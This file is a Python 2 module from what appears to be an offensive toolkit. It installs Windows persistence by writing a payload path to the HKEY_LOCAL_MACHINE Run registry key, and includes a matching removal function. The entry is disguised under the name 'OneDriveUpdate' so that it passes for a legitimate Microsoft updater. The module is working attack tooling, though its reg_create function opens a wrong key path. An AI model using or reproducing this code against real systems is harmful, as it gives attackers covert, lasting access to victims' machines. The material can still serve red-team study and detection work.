import os
import wmi
import ctypes
import _winreg
from core.prints import *

wmi = wmi.WMI()

def architecture():
	for os in wmi.Win32_OperatingSystem():
		return os.OSArchitecture

def reg_delete(path,name):
	try:
		key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join(path),0,_winreg.KEY_ALL_ACCESS)
		_winreg.DeleteValue(key,name)
		_winreg.CloseKey(key)
	except Exception as error:
		return False
	else:
		return True

def reg_create(path,name,payload):
	try:
		key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join(path,name),0,_winreg.KEY_ALL_ACCESS)
		_winreg.SetValueEx(key,name,0,_winreg.REG_SZ,payload)
		_winreg.CloseKey(key)
	except Exception as error:
		return False
	else:
		return True

def hklm_run_delete():
	"""
	Delete persistence by calling this function
	"""
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		if ("64" in architecture()):
			if (reg_delete("Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run","OneDriveUpdate") == True):
				print_success("Successfully deleted persistence key")
			else:
				print_error("Unable to delete persistence key")
				return False
		else:
			if (reg_delete("Software\Microsoft\Windows\CurrentVersion\Run","OneDriveUpdate") == True):
				print_success("Successfully deleted persistence key")
			else:
				print_error("Unable to delete persistence key")
				return False
	else:
		print_error("Unable to delete persistence, we are not elevated")
		return False

def hklm_run(payload):
	print """
 -------------------------------------------------------------
 Persistence technique using HKEY_LOCAL_MACHINE Run registry
 key to add executable to startup. This is very easy to
 detect.
 
 When everything worked correctly, we should gain persistence
 with current user privledges.
 -------------------------------------------------------------
 """
	print_info("Payload: {}".format(payload))

	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		if ("64" in architecture()):
			if (reg_create("Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run","OneDriveUpdate",payload) == True):
				print_success("Successfully created persistence key")
			else:
				print_error("Unable to create persistence key")
				return False
		else:
			if (reg_create("Software\Microsoft\Windows\CurrentVersion\Run","OneDriveUpdate",payload) == True):
				print_success("Successfully created persistence key")
			else:
				print_error("Unable to create persistence key")
				return False
	else:
		print_error("Unable to create persistence key, we are not elevated")
		return False